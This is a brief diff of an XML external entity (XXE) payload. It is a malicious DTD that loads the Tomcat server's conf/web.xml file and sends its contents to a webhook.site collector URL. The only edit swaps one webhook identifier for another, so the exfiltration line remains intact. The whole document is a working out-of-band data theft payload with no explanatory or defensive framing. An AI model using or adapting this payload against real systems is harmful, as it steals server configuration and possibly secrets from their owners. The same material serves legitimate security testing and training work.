@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/web.xml">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/7d834083-ade6-434f-8cc2-1cb475a1a72b/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/372212bb-9595-40a4-8d40-b4238f9266df/?x=%file;'>">
 %eval;
 %exfiltrate;
